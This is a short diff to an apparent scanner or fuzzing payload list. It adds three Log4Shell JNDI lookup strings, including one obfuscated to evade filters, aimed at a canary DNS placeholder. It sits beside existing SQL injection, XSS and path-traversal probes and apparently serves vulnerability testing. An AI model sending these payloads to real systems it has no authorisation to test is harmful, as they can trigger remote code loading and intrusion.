@@ -243,3 +243,6 @@ UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING(@canary_dns))
 xsstest
 xsstest%00"<>'
 xxx/../{base}
+${jndi:ldap://@canary_dns:1389/a}
+${jndi:rmi://@canary_dns:1099/a}
+${${::-J}n${::-d}i:ld${::-a}p://@canary_dns:1389}
